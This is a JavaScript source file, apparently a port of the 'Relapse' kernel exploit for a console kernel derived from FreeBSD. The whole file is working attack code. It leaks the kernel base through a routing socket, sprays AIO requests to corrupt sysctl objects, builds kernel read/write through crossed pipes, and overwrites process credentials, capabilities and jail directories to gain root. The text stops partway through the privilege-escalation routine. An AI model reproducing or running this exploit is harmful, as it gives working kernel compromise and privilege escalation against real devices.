// Relapse (Sonic_Iso / ntfargo), adapted to the loader ARW, gated chain, and kexp launcher.
// https://github.com/ntfargo/Relapse-Exploit
// https://github.com/soniciso1/relapse

const int64 = globalThis.int64;
if (typeof int64 !== "function")
  throw new Error("int64 is missing from the page; src/utils/int64.js did not load");

// ======================= PORT BOUNDARY: upstream starts here ==================

const AF_UNIX = 1, AF_INET = 2, AF_ROUTE = 17, AF_INET6 = 28;
const SOCK_STREAM = 1, SOCK_RAW = 3;
const MSG_DONTWAIT = 0x80;
const RLIMIT_NOFILE = 8;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const RTP_SET = 1, PRI_REALTIME = 2, PRI_NORMAL = 3;
const AIO_CMD_READ = 1;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Delays after parking AIO workers and between armed sweep groups.
const POST_PARK_DELAY_MS = 1000;
const SWEEP_DELAY_MS = 100;

async function runKernelExploit(p, chain, log, launchKexp) {
  return new KernelExploit(p, chain, log, launchKexp).run();
}

class KernelExploit {
  constructor(p, chain, log, launchKexp) {
    this.p = p;
    this.chain = chain;
    this.onScreen = typeof log === "function" ? log : () => {};
    this.launchKexp = typeof launchKexp === "function" ? launchKexp : null;

    this.off = window.KRW;
    if (!this.off) throw new Error("offsets/" + window.fw_str + ".js did not define window.KRW");
    this.tuning = {
      waiters: 18,
      requests: 13,
      churnBefore: 32,
      churnAfter: 256,
      sprays: 64,
      workerBlockers: 24,
      waitTimeoutUs: 10000,
    };

    this.kbase = null;
    this.curproc = null;
    this.ucred = null;
    this.procFdAddr = null;
    this.master = null;
    this.victim = null;

    this.fds = [];
    this.windowHigh = 0xffffffff;

    this.armedGroups = [];

    this.scratch = {
      states: p.malloc(0x400, 1),
      qword: p.malloc(8, 1),
    };
  }

  async report(tag, detail, type) {
    const label = String(tag);
    await this.onScreen(detail ? label + ": " + detail : label, type);
  }

  async sysInt(number, ...args) {
    return (await this.chain.syscall(number, ...args)).low | 0;
  }

  readU8(base, offset) {
    return this.p.read1(base.add32(offset));
  }
  readU32(base, offset) {
    return this.p.read4(base.add32(offset));
  }
  readU64(base, offset) {
    return this.p.read8(base.add32(offset));
  }
  writeU8(base, offset, value) {
    this.p.write1(base.add32(offset), value & 0xff);
  }
  writeU32(base, offset, value) {
    this.p.write4(base.add32(offset), value >>> 0);
  }
  writeU64(base, offset, value) {
    this.p.write8(base.add32(offset), value);
  }

  alloc(size) {
    const buffer = this.p.malloc(size, 1);
    this.clear(buffer, size);
    return buffer;
  }
  clear(buffer, size) {
    for (let i = 0; i < size; i += 4) this.p.write4(buffer.add32(i), 0);
  }

  kaddr(rva) {
    return this.kbase.add32(rva);
  }

  isKernelPointer(value) {
    return !!value && value.hi >>> 16 === 0xffff && (value.low & 7) === 0 &&
      !(value.hi === 0xffffffff && value.low === 0xffffffff);
  }

  async readKernelPointer(address) {
    const { rv, value } = await this.kread64(address);
    return rv === 0 && this.isKernelPointer(value) ? value : null;
  }

  // thread affinity
  async pinToSingleCore() {
    const id = new int64(0xffffffff, 0xffffffff);
    const current = this.alloc(0x10);
    await this.sysInt(SYS_CPUSET_GETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, current);
    const allowed = this.readU32(current, 0) >>> 0;
    this.allowedMask = allowed;

    let core = -1;
    for (let c = 0; c < 16 && core < 0; c++) if (allowed & (1 << c)) core = c;
    if (core < 0) {
      await this.report("PIN", "no allowed core in mask 0x" + allowed.toString(16));
      return;
    }

    const mask = this.alloc(0x10);
    this.writeU8(mask, (core >> 3) & 0xf, 1 << (core & 7));
    await this.sysInt(SYS_CPUSET_SETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, mask);

    const rtprio = this.alloc(0x10);
    this.writeU8(rtprio, 0, PRI_REALTIME);
    await this.sysInt(SYS_RTPRIO_THREAD, RTP_SET, 0, rtprio);

    this.pinnedCore = core;
  }

  async restoreThreadAttributes() {
    if (this.threadAttributesRestored) return;

    const id = new int64(0xffffffff, 0xffffffff);
    const want = this.allowedMask >>> 0 || 0xea00;
    const mask = this.alloc(0x10);
    this.writeU8(mask, 0, want & 0xff);
    this.writeU8(mask, 1, (want >>> 8) & 0xff);
    await this.sysInt(SYS_CPUSET_SETAFFINITY, CPU_LEVEL_WHICH, CPU_WHICH_TID, id, 0x10, mask);

    const rtprio = this.alloc(0x10);
    this.writeU8(rtprio, 0, PRI_NORMAL);
    await this.sysInt(SYS_RTPRIO_THREAD, RTP_SET, 0, rtprio);

    this.threadAttributesRestored = true;
  }

  // sysctl
  async sysctl(mib, oldPtr, oldLen, newPtr, newLen) {
    const mibPtr = this.alloc(4 * mib.length + 8);
    mib.forEach((value, i) => this.writeU32(mibPtr, i * 4, value));
    const lenPtr = this.alloc(8);
    this.writeU32(lenPtr, 0, oldLen >>> 0);
    const rv = await this.sysInt(SYS___SYSCTL, mibPtr, mib.length, oldPtr || 0, oldPtr ? lenPtr : 0, newPtr || 0, newLen >>> 0);
    return { rv, len: oldPtr ? this.readU32(lenPtr, 0) >>> 0 : 0 };
  }

  async sysctlReadInt(mib) {
    const value = this.alloc(8);
    const { rv } = await this.sysctl(mib, value, 4, 0, 0);
    return { rv, value: this.readU32(value, 0) | 0 };
  }

  async sysctlWriteInt(mib, value) {
    const buffer = this.alloc(8);
    this.writeU32(buffer, 0, value >>> 0);
    return (await this.sysctl(mib, 0, 0, buffer, 4)).rv;
  }

  async nameToMib(name) {
    const nameBuf = this.alloc(name.length + 1);
    for (let i = 0; i < name.length; i++)
      this.writeU8(nameBuf, i, name.charCodeAt(i));
    const out = this.alloc(0x60);
    const { rv, len } = await this.sysctl([0, 3], out, 0x60, nameBuf, name.length);
    if (rv !== 0) return null;
    const mib = [];
    for (let i = 0; i < len >>> 2; i++) mib.push(this.readU32(out, i * 4) | 0);
    return mib;
  }

  async oidKind(mib) {
    const out = this.alloc(0x100);
    const { rv } = await this.sysctl([0, 4].concat(mib), out, 0x100, 0, 0);
    return rv === 0 ? this.readU32(out, 0) >>> 0 : null;
  }

  // KASLR
  async firstInterfaceAddress() {
    const RECORD = 0x3c0,
      IP = 40;
    const count = await this.sysInt(SYS_NETGETIFLIST, 0, 10);
    if (count <= 0 || count > 256) return null;

    const list = this.alloc(RECORD * count);
    if ((await this.sysInt(SYS_NETGETIFLIST, list, count)) < 0) return null;

    for (let i = 0; i < count; i++) {
      const octets = [0, 1, 2, 3].map((b) =>
        this.readU8(list, RECORD * i + IP + b),
      );
      if (octets.some((o) => o !== 0)) return octets;
    }
    return null;
  }

  async leakKernelBase() {
    const sockaddrLen = (len) => (len ? ((len - 1) & ~7) + 8 : 8);
    const DST_LEN = 88;
    const AUTHOR = 152 + sockaddrLen(DST_LEN);
    const MSG_LEN = AUTHOR + 256;
    const AUTHOR_INDEX = 6;
    const RET_SLOT = 184;

    const dst = await this.firstInterfaceAddress();
    if (!dst) throw new Error("kaslr: no interface has an address");

    const fd = await this.sysInt(SYS_SOCKET, AF_ROUTE, SOCK_RAW, 0);
    if (fd < 0) throw new Error("kaslr: routing socket is gated");
    this.fds.push(fd);

    const timeout = this.alloc(16);
    this.writeU32(timeout, 0, 5);
    await this.sysInt(SYS_SETSOCKOPT, fd, 0xffff, 0x20, timeout, 16);

    const msg = this.alloc(512);
    this.writeU8(msg, 0, MSG_LEN & 0xff);
    this.writeU8(msg, 1, (MSG_LEN >>> 8) & 0xff);
    this.writeU8(msg, 2, 5); // RTM_VERSION
    this.writeU8(msg, 3, 0x04); // RTM_GET
    this.writeU32(msg, 12, 0x41); // RTA_DST | RTA_AUTHOR
    this.writeU32(msg, 20, 0x1234); // rtm_seq
    this.writeU8(msg, 152, DST_LEN);
    this.writeU8(msg, 153, AF_INET);
    this.writeU32(msg, 156, (dst[3] << 24) | (dst[2] << 16) | (dst[1] << 8) | dst[0]);
    this.writeU8(msg, AUTHOR + 0, 255);
    this.writeU8(msg, AUTHOR + 1, AF_INET6);
    if ((await this.sysInt(SYS_WRITE, fd, msg, MSG_LEN)) < 0)
      throw new Error("kaslr: routing socket rejected the request");

    const reply = this.alloc(4096);
    let len = 0;
    for (let attempt = 0; attempt < 8 && len <= 0; attempt++) {
      len = await this.sysInt(SYS_RECVFROM, fd, reply, 4096, MSG_DONTWAIT, 0, 0);
      if (len <= 0) await sleep(1);
    }
    if (len <= 0) throw new Error("kaslr: no routing reply");

    const present = this.readU32(reply, 12) | 0;
    let cursor = 152,
      author = 0;
    for (let i = 0; i < 8; i++) {
      if (!(present & (1 << i))) continue;
      if (cursor + 2 > len) break;
      if (i === AUTHOR_INDEX) {
        author = cursor;
        break;
      }
      cursor += sockaddrLen(this.readU8(reply, cursor));
    }
    if (!author || author + 200 > len)
      throw new Error("kaslr: reply carries no author record");

    const { retStatic, retLow16 } = this.off.kaslr;
    const ret = this.readU64(reply, author + RET_SLOT);
    if (ret.hi !== 0xffffffff || (ret.low & 0xffff) !== (retLow16 & 0xffff))
      throw new Error("kaslr: author+" + RET_SLOT + " = 0x" + ret.toString() + " is not the expected return address");

    this.kbase = new int64((ret.low - retStatic) >>> 0, ret.hi);
  }

  // decrement primitive
  async raiseFdLimit() {
    const limit = this.alloc(0x10);
    if ((await this.sysInt(SYS_GETRLIMIT, RLIMIT_NOFILE, limit)) === -1) return;
    this.writeU64(limit, 0, this.readU64(limit, 8));
    await this.sysInt(SYS_SETRLIMIT, RLIMIT_NOFILE, limit);
  }

  async openSocketPair(buffer, error) {
    this.clear(buffer, 8);
    if ((await this.sysInt(SYS_SOCKETPAIR, AF_UNIX, SOCK_STREAM, 0, buffer)) === -1)
      throw new Error(error);

    const pair = {
      readFd: this.readU32(buffer, 0),
      writeFd: this.readU32(buffer, 4),
    };
    this.fds.push(pair.readFd, pair.writeFd);
    return pair;
  }

  async submitBlockedRead(request, sink, readFd, idOut) {
    this.clear(request, 0x40);
    this.writeU32(request, 0x08, 1);
    this.writeU64(request, 0x10, sink);
    this.writeU32(request, 0x20, readFd);

    const rv = await this.sysInt(SYS_AIO_SUBMIT_CMD, AIO_CMD_READ, request, 1, 3, idOut);
    return rv === 0 ? this.readU32(idOut, 0) : null;
  }

  async parkAioWorkers(limit) {
    const pairBuffer = this.alloc(8);
    const pair = await this.openSocketPair(pairBuffer, "socketpair for the worker park failed");
    this.workerPark = pair;

    const sink = this.alloc(0x40);
    const request = this.alloc(0x40);
    const ids = this.alloc(4 * limit + 8);
    const states = this.alloc(4 * limit + 8);
    const idOut = this.alloc(8);

    let sent = 0;
    let parked = 0;
    let quietRounds = 0;

    while (sent < limit && quietRounds < 2) {
      for (let i = 0; i < 4 && sent < limit; i++) {
        const id = await this.submitBlockedRead(request, sink, pair.readFd, idOut);
        if (id === null) return;
        this.writeU32(ids, sent * 4, id);
        sent++;
      }

      await sleep(60);
      await this.sysInt(SYS_AIO_MULTI_POLL, ids, sent, states);
      let inFlight = 0;
      for (let i = 0; i < sent; i++)
        if ((this.readU32(states, i * 4) & 0xffff) === 2) inFlight++;

      if (inFlight === parked) quietRounds++;
      else {
        parked = inFlight;
        quietRounds = 0;
      }
    }
  }

  async waitForPendingRequests(candidateIds, candidateCount, wantedCount) {
    const pollId = this.alloc(4);
    const pollState = this.alloc(4);
    const pendingIndices = [];
    const seen = new Set();

    for (let attempt = 0; attempt < 150 && pendingIndices.length < wantedCount; attempt++) {
      for (let index = 0; index < candidateCount && pendingIndices.length < wantedCount; index++) {
        if (seen.has(index)) continue;

        this.writeU32(pollId, 0, this.readU32(candidateIds, index * 4));
        await this.sysInt(SYS_AIO_MULTI_POLL, pollId, 1, pollState);
        if ((this.readU32(pollState, 0) & 0xffff) === 1) {
          pendingIndices.push(index);
          seen.add(index);
        }
      }
      if (pendingIndices.length < wantedCount) await sleep(20);
    }

    if (pendingIndices.length !== wantedCount)
      throw new Error(`${pendingIndices.length}/${wantedCount} requests stayed pending`);
    return pendingIndices;
  }

  async claimPendingRequests(count) {
    const candidateCount = Math.max(count + 8, 0x18);
    const candidateIds = this.alloc(4 * candidateCount);
    const request = this.alloc(0x40);
    const sink = this.alloc(0x40);
    const pairBuffer = this.alloc(8);
    const idOut = this.alloc(4);

    for (let index = 0; index < candidateCount; index++) {
      const pair = await this.openSocketPair(pairBuffer, "socketpair failed while claiming requests");
      const id = await this.submitBlockedRead(request, sink, pair.readFd, idOut);
      if (id === null) throw new Error("aio request submission failed");
      this.writeU32(candidateIds, index * 4, id);
    }

    const pending = await this.waitForPendingRequests(candidateIds, candidateCount, count);
    const ids = this.alloc(4 * count);
    pending.forEach((index, output) => {
      this.writeU32(ids, output * 4, this.readU32(candidateIds, index * 4));
    });
    return { ids, count };
  }

  buildWaiterNodes(count, firstTarget, secondTarget) {
    const nodes = this.alloc(count * this.off.aio.requestSize);
    for (let i = 0; i < count; i++)
      this.writeU32(nodes, i * this.off.aio.requestSize + 0x20, 0xffffffff);
    this.writeU64(nodes, 0x00, firstTarget);
    this.writeU64(nodes, 0x08, secondTarget);
    this.writeU64(nodes, 0x10, this.kaddr(this.off.nodeMutex));
    return nodes;
  }

  rememberArmedGroup(group) {
    const ids = [];
    for (let index = 0; index < group.count; index++)
      ids.push(this.readU32(group.ids, index * 4) >>> 0);
    this.armedGroups.push(ids);
  }

  async runReclaimBatch(group, nodes) {
    const { requests, churnBefore, churnAfter, sprays, waitTimeoutUs } = this.tuning;
    const requestSize = this.off.aio.requestSize;
    const sprayedIds = this.alloc(4 * requests * (sprays + 1));
    const returns = this.alloc(8 * (sprays + 1));
    const timeout = this.alloc(16);
    this.writeU32(timeout, 0, waitTimeoutUs);

    const churnRequest = (0x80000000 | ((requests * requestSize) << 16) | 0x4101) >>> 0;
    const preflight = await this.sysInt(SYS_IOCTL, 0xffffffff, churnRequest, nodes);
    if (preflight !== -1) return null;

    this.chain.clear();
    for (let i = 0; i < churnBefore; i++)
      this.chain.add_syscall(SYS_IOCTL, 0xffffffff, churnRequest, nodes);

    this.chain.add_syscall(SYS_AIO_MULTI_WAIT, group.ids, group.count, this.scratch.states, 0, timeout);

    for (let i = 0; i < churnAfter; i++)
      this.chain.add_syscall(SYS_IOCTL, 0xffffffff, churnRequest, nodes);

    for (let i = 0; i < sprays; i++)
      this.chain.add_syscall_ret(returns.add32(i * 8), SYS_AIO_SUBMIT_CMD, AIO_CMD_READ, nodes, requests, 3, sprayedIds.add32(i * 4 * requests));

    await this.chain.run();

    let accepted = 0;
    for (let i = 0; i < sprays; i++)
      if ((this.readU32(returns, i * 8) | 0) === 0) accepted++;
    return accepted;
  }

  async cancelRequest(group, index) {
    return this.sysInt(SYS_AIO_MULTI_CANCEL, group.ids.add32(index * 4), 1, this.scratch.states);
  }

  async firstPendingRequest(group) {
    await this.sysInt(SYS_AIO_MULTI_POLL, group.ids, group.count, this.scratch.states);

    for (let index = 0; index < group.count; index++) {
      const state = this.readU32(this.scratch.states, index * 4) & 0xffff;
      if (state !== 1) continue;

      const canary = group.count - 1;
      if (canary !== index) await this.cancelRequest(group, canary);
      return index;
    }
    return -1;
  }

  async reclaimWaiterArray(tag, firstTarget, secondTarget) {
    const { waiters, requests, sprays } = this.tuning;

    const group = await this.claimPendingRequests(waiters);
    this.rememberArmedGroup(group);

    const nodes = this.buildWaiterNodes(requests, firstTarget, secondTarget);
    const accepted = await this.runReclaimBatch(group, nodes);
    if (accepted === null) {
      await this.report(tag, "invalid churn request");
      return null;
    }
    if (accepted !== sprays) {
      await this.report(tag, `${sprays - accepted} reclaim submits failed`);
      return null;
    }

    const firstPending = await this.firstPendingRequest(group);
    if (firstPending < 0) {
      await this.report(tag, "no pending request is available");
      return null;
    }

    return { group, firstPending, heads: group.count - 1 };
  }

  async flipOidKind(tag, reclaim, mib, target) {
    let kind = await this.oidKind(mib);
    if (kind === null) {
      await this.report(tag, "oid is hidden before the flip");
      return false;
    }

    for (let i = 0; i < reclaim.heads && kind !== target; i++) {
      await this.cancelRequest(reclaim.group, i);
      const next = await this.oidKind(mib);
      if (next === null) {
        await this.report(tag, "oid disappeared during the flip");
        return false;
      }
      kind = next;

      if (((kind >>> 24) & 0xff) < ((target >>> 24) & 0xff)) {
        await this.report(tag, "oid flip overshot into oid_arg1");
        return false;
      }
    }

    if (kind !== target) {
      await this.report(tag, "not enough waiter heads");
      return false;
    }
    return true;
  }

  // slow kernel read/write

  async setWindowLow(value) {
    return this.sysctlWriteInt(this.mibA, value >>> 0);
  }

  async setWindowHigh(value) {
    if (this.mibC) return this.sysctlWriteInt(this.mibC, value >>> 0);

    if (this.windowHigh !== 0xffffffff) return -1;
    const selfHigh = this.kaddr(this.off.oid.b.arg1 + 4);
    const rv = await this.setWindowLow(selfHigh.low);
    return rv !== 0 ? rv : this.sysctlWriteInt(this.mibB, value >>> 0);
  }

  async aimWindow(address) {
    const high = address.hi >>> 0;
    if (this.windowHigh !== high) {
      const rv = await this.setWindowHigh(high);
      if (rv !== 0) return rv;
      this.windowHigh = high;
    }
    return this.setWindowLow(address.low);
  }

  async kread32(address) {
    if ((await this.aimWindow(address)) !== 0) return { rv: -1, value: 0 };
    const { rv, value } = await this.sysctlReadInt(this.mibB);
    return { rv, value: value >>> 0 };
  }

  async kwrite32(address, value) {
    if ((await this.aimWindow(address)) !== 0) return -1;
    return this.sysctlWriteInt(this.mibB, value >>> 0);
  }

  async kread64(address) {
    const low = await this.kread32(address);
    const high = await this.kread32(address.add32(4));
    return { rv: low.rv | high.rv, value: new int64(low.value, high.value) };
  }

  async kwrite64(address, value) {
    const rv = await this.kwrite32(address, value.low);
    return rv !== 0 ? rv : this.kwrite32(address.add32(4), value.hi);
  }

  async prepareHighWriter() {
    const { c, b, writableKind } = this.off.oid;
    if (this.windowHigh !== 0xffffffff) {
      await this.report("kernel rw", "writer window already left the kernel image");
      return false;
    }
    if ((await this.kwrite32(this.kaddr(c.kind), writableKind)) !== 0)
      return false;
    if ((await this.kwrite64(this.kaddr(c.arg1), this.kaddr(b.arg1 + 4))) !== 0)
      return false;

    const probe = await this.sysctlReadInt(c.mib);
    if (probe.rv !== 0 || (probe.value >>> 0) !== 0xffffffff) {
      await this.report("kernel rw", "high writer self-test failed");
      return false;
    }

    this.mibC = c.mib;
    return true;
  }

  async makeOidWritable(tag, mib, kindByte) {
    const { a, originalKind, writableKind } = this.off.oid;
    const kind = await this.oidKind(mib);
    if (kind !== originalKind) {
      await this.report(tag, `unexpected oid kind ${kind === null ? "missing" : kind.toString(16)}`);
      return false;
    }

    const reclaim = await this.reclaimWaiterArray(tag, this.kaddr(a.deadSink), this.kaddr(kindByte));
    if (!reclaim) return false;
    return this.flipOidKind(tag, reclaim, mib, writableKind);
  }

  async steerOidWindow() {
    const { a, b } = this.off.oid;
    if ((await this.oidKind(this.mibB)) !== null) {
      await this.report("Kernel", "oid is already visible");
      return false;
    }

    const aValue = await this.sysctlReadInt(this.mibA);
    if (aValue.rv !== 0) {
      await this.report("Kernel", "steering oid is not readable");
      return false;
    }

    const reclaim = await this.reclaimWaiterArray("Kernel", this.kaddr(a.arg1Byte1), this.kaddr(b.visible));
    if (!reclaim) return false;

    await this.cancelRequest(reclaim.group, reclaim.firstPending);

    const steered = await this.sysctlReadInt(this.mibA);
    const expected = this.kaddr(b.arg1Value).low >>> 0;
    if (steered.rv !== 0 || steered.value >>> 0 !== expected) {
      await this.report("Kernel", "oid steering check failed");
      return false;
    }
    this.windowHigh = 0xffffffff;
    return true;
  }

  async testKernelRead() {
    const b = this.off.oid.b;
    const kindViaOidfmt = await this.oidKind(this.mibB);
    const kindViaRead = await this.kread32(this.kaddr(b.kind));
    const ok = kindViaOidfmt !== null && kindViaRead.rv === 0 && kindViaRead.value === kindViaOidfmt;
    if (!ok) await this.report("Kernel", "read self-test failed");
    return ok;
  }

  async testKernelWrite() {
    const counter = this.kaddr(this.off.walkCounter.addr);
    const mib = this.off.walkCounter.mib;
    const before = await this.sysctlReadInt(mib);
    const rv = await this.kwrite32(counter, 0x41424344);
    const after = await this.sysctlReadInt(mib);
    const ok = rv === 0 && after.value >>> 0 === 0x41424344;
    if (ok) await this.kwrite32(counter, before.value >>> 0);
    else await this.report("Kernel", "write self-test failed");
    return ok;
  }

  async armKernelReadWrite() {
    const { a, b } = this.off.oid;

    this.mibA = await this.nameToMib("kern.smp.cpus");
    this.mibB = await this.nameToMib("kern.smp.maxcpus");
    if (!this.mibA || !this.mibB || (await this.oidKind(this.mibA)) !== this.off.oid.originalKind) {
      await this.report("Kernel", "unexpected oid state");
      return false;
    }

    await this.raiseFdLimit();
    await this.parkAioWorkers(this.tuning.workerBlockers);
    if (POST_PARK_DELAY_MS > 0) await sleep(POST_PARK_DELAY_MS);

    if (!(await this.makeOidWritable("arm a", this.mibA, a.kindByte3))) return false;
    if (!(await this.steerOidWindow())) return false;
    if (!(await this.testKernelRead())) return false;
    if (!(await this.makeOidWritable("arm c", this.mibB, b.kindByte3))) return false;
    if (!(await this.testKernelWrite())) return false;

    return this.prepareHighWriter();
  }

  async findProcess(targetPid) {
    const head = await this.readKernelPointer(this.kaddr(this.off.allproc));
    if (!head) {
      await this.report("Process", "allproc is not a kernel pointer");
      return null;
    }

    let proc = head;
    for (let hop = 0; hop < 4096; hop++) {
      const pid = await this.kread32(proc.add32(this.off.proc.pid));
      if (pid.rv !== 0) return null;
      if ((pid.value | 0) < 0 || (pid.value | 0) > 0x40000) {
        await this.report("Process", "invalid pid while walking allproc");
        return null;
      }
      if ((pid.value | 0) === targetPid) return proc;

      const next = await this.readKernelPointer(proc);
      if (!next) return null;
      proc = next;
    }
    return null;
  }

  async findCurrentProcess() {
    const myPid = await this.sysInt(SYS_GETPID);
    const proc = await this.findProcess(myPid);
    if (!proc) {
      await this.report("Process", "current process is not in allproc");
      return false;
    }
    this.curproc = proc;

    const fd = await this.kread64(this.curproc.add32(this.off.proc.fd));
    if (this.isKernelPointer(fd.value)) this.procFdAddr = fd.value;

    const aioInfo = await this.kread64(this.curproc.add32(this.off.proc.aioInfo));
    const ucred = await this.kread64(this.curproc.add32(this.off.proc.ucred));
    if (this.isKernelPointer(ucred.value)) this.ucred = ucred.value;

    const ok = aioInfo.rv === 0 && this.isKernelPointer(aioInfo.value);
    if (ok) await this.report("aio_info_addr", "0x" + aioInfo.value.toString(), "info");
    else await this.report("Process", "aio info pointer is invalid");
    if (this.ucred) await this.report("ucred_addr", "0x" + this.ucred.toString(), "info");
    return ok;
  }

  // read/write
  async findPipe(fdp, fd, label) {
    const table = await this.readKernelPointer(fdp.add32(this.off.filedesc.files));
    if (!table) {
      await this.report("Pipes", label + " file table is invalid");
      return null;
    }

    const count = await this.kread32(table.add32(this.off.filedescTable.nfiles));
    if (count.rv !== 0 || fd >= count.value) {
      await this.report("Pipes", label + " descriptor is outside the file table");
      return null;
    }

    const entry = this.off.filedescTable.ofiles + fd * this.off.filedescTable.entryStride;
    const file = await this.readKernelPointer(table.add32(entry));
    if (!file) {
      await this.report("Pipes", label + " file pointer is invalid");
      return null;
    }

    const pipe = await this.readKernelPointer(file.add32(this.off.filedescTable.fileData));
    if (!pipe) {
      await this.report("Pipes", label + " pipe pointer is invalid");
      return null;
    }

    const pair = await this.kread64(pipe.add32(this.off.pipe.pair));
    const isReadEnd = pair.rv === 0 && pair.value.hi === pipe.hi && pair.value.low === pipe.low;
    return { pipe, isReadEnd };
  }

  async locatePipes() {
    const fdp = await this.readKernelPointer(this.curproc.add32(this.off.proc.fd));
    if (!fdp) {
      await this.report("Pipes", "process file table is invalid");
      return false;
    }

    const pair = this.alloc(16);
    const probe = this.alloc(8);
    const located = [];

    // Nonblocking reads let the existing short-read checks handle an empty pipe.
    const O_NONBLOCK = 0x4;

    for (const label of ["master", "victim"]) {
      this.clear(pair, 16);
      if ((await this.sysInt(SYS_PIPE2, pair, O_NONBLOCK)) !== 0) {
        await this.report("Pipes", "could not create the " + label + " pipe");
        return false;
      }
      const readFd = this.readU32(pair, 0) | 0;
      const writeFd = this.readU32(pair, 4) | 0;
      this.fds.push(readFd, writeFd);

      const info = await this.findPipe(fdp, readFd, label);
      if (!info) return false;
      if (!info.isReadEnd) {
        await this.report("Pipes", label + " pipe self-check failed");
        return false;
      }

      // Put a byte in, then read the counters back through the kernel: an
      // independent check that this is the pipe behind our own fd.
      this.writeU32(probe, 0, 0x5a);
      await this.sysInt(SYS_WRITE, writeFd, probe, 1);
      const count = await this.kread32(info.pipe.add32(this.off.pipe.count));
      if (count.value !== 1) {
        await this.report("Pipes", label + " pipe counter check failed");
        return false;
      }

      located.push({ readFd, writeFd, pipe: info.pipe });
    }

    [this.master, this.victim] = located;
    return true;
  }

  async aimVictim(address, count, size) {
    const { count: C, size: S, buffer: B } = this.off.pipe;
    this.clear(this.aimBuffer, 0x18);
    this.writeU32(this.aimBuffer, C, count >>> 0);
    this.writeU32(this.aimBuffer, S, size >>> 0);
    this.writeU64(this.aimBuffer, B, address);

    const written = await this.sysInt(SYS_WRITE, this.master.writeFd, this.aimBuffer, 0x18);
    const drained = await this.sysInt(SYS_READ, this.master.readFd, this.drainBuffer, 0x18);
    return written === 0x18 && drained === 0x18 ? 0 : -1;
  }

  async kreadFast(address, length, dest) {
    if ((await this.aimVictim(address, length, this.pipeSize)) !== 0) return -1;
    return this.sysInt(SYS_READ, this.victim.readFd, dest, length);
  }

  async kwriteFast(address, length, src) {
    if ((await this.aimVictim(address, 0, this.pipeSize)) !== 0) return -1;
    return this.sysInt(SYS_WRITE, this.victim.writeFd, src, length);
  }

  async readKernel32(address) {
    const buffer = this.scratch.qword;
    return (await this.kreadFast(address, 4, buffer)) === 4
      ? this.readU32(buffer, 0) >>> 0
      : -1;
  }

  async readKernel64(address) {
    const buffer = this.scratch.qword;
    return (await this.kreadFast(address, 8, buffer)) === 8
      ? this.readU64(buffer, 0)
      : new int64(0, 0);
  }

  async writeKernel32(address, value) {
    const buffer = this.scratch.qword;
    this.writeU32(buffer, 0, value);
    return (await this.kwriteFast(address, 4, buffer)) === 4;
  }

  async writeKernel64(address, value, high) {
    const buffer = this.scratch.qword;
    this.writeU32(buffer, 0, value.low === undefined ? value : value.low);
    this.writeU32(buffer, 4, value.hi === undefined ? high : value.hi);
    return (await this.kwriteFast(address, 8, buffer)) === 8;
  }

  async crossPipes() {
    const master = this.master.pipe;
    const victim = this.victim.pipe;
    const { count, in: inOff, out: outOff, size, buffer } = this.off.pipe;

    this.pipeSize = this.off.pipe.defaultSize;
    this.aimBuffer = this.alloc(0x20);
    this.drainBuffer = this.alloc(0x40);

    const inValue = await this.kread32(master.add32(inOff));
    const outValue = await this.kread32(master.add32(outOff));
    if (inValue.rv !== 0 || inValue.value !== 1 || outValue.value !== 0) {
      await this.report("pipes", "master pipe is not in the expected state");
      return false;
    }
    await this.sysInt(SYS_READ, this.master.readFd, this.drainBuffer, 1);

    const fields = [
      [count, 0],
      [inOff, 0],
      [outOff, 0],
      [size, this.pipeSize],
      [buffer, victim.low >>> 0],
      [buffer + 4, victim.hi >>> 0],
    ];
    for (const [offset, value] of fields) {
      let ok = false;
      for (let attempt = 0; attempt < 3 && !ok; attempt++) {
        await this.kwrite32(master.add32(offset), value);
        const readBack = await this.kread32(master.add32(offset));
        ok = readBack.rv === 0 && readBack.value === value >>> 0;
      }
      if (!ok) {
        await this.report("Pipes", "could not update the master pipe");
        return false;
      }
    }
    this.crossed = true;

    const { rva, text } = this.off.rodataProbe;
    const out = this.alloc(0x40);
    const got = await this.kreadFast(this.kaddr(rva), text.length, out);
    let read = "";
    for (let i = 0; i < text.length; i++)
      read += String.fromCharCode(this.readU8(out, i));

    const match = got === text.length && read === text;
    if (!match) await this.report("Pipes", "kernel read check failed");
    return match;
  }

  // Privileges
  async escalate() {
    if (!this.crossed || !this.ucred) {
      await this.report("Privileges", "kernel rw or credentials are missing");
      return false;
    }

    const rootvnode = await this.readKernelPointer(this.kaddr(this.off.rootvnode));
    if (!rootvnode) {
      await this.report("Privileges", "could not find rootvnode");
      return false;
    }

    const { ucred, sysCoreAuthId, filedesc, dynlib, proc } = this.off;
    const cred = this.ucred;

    await this.writeKernel32(cred.add32(ucred.uid), 0);
    await this.writeKernel32(cred.add32(ucred.ruid), 0);
    await this.writeKernel32(cred.add32(ucred.svuid), 0);
    await this.writeKernel32(cred.add32(ucred.ngroups), 1);
    await this.writeKernel32(cred.add32(ucred.rgid), 0);
    await this.writeKernel32(cred.add32(ucred.svgid), 0);
    await this.writeKernel64(cred.add32(ucred.sceAuthId), sysCoreAuthId.lo, sysCoreAuthId.hi);
    await this.writeKernel64(cred.add32(ucred.sceCaps), 0xffffffff, 0xffffffff);
    await this.writeKernel64(cred.add32(ucred.sceCaps1), 0xffffffff, 0xffffffff);

    const attrsLow = await this.readKernel32(cred.add32(ucred.sceAttrs));
    const attrsHigh = await this.readKernel32(cred.add32(ucred.sceAttrs + 4));
    await this.writeKernel64(cred.add32(ucred.sceAttrs), ((attrsLow & 0x00ffffff) | 0x80000000) >>> 0, attrsHigh);

    const fdp = (await this.kread64(this.curproc.add32(proc.fd))).value;
    await this.writeKernel64(fdp.add32(filedesc.cdir), rootvnode);
    await this.writeKernel64(fdp.add32(filedesc.rdir), rootvnode);
    await this.writeKernel64(fdp.add32(filedesc.jdir), 0, 0);

    const dynlibPtr = await this.kread64(this.curproc.add32(proc.dynlib));
    if (this.isKernelPointer(dynlibPtr.value)) {
      await this.writeKernel64(dynlibPtr.value.add32(dynlib.syscallStart), 0, 0);
      await this.writeKernel64(dynlibPtr.value.add32(dynlib.syscallEnd), 0xffffffff, 0xffffffff);
      await this.writeKernel32(dynlibPtr.value.add32(dynlib.restrictFlags), 0);
      await this.writeKernel64(dynlibPtr.value.add32(dynlib.libkernelRef), 1, 0);
    } else {
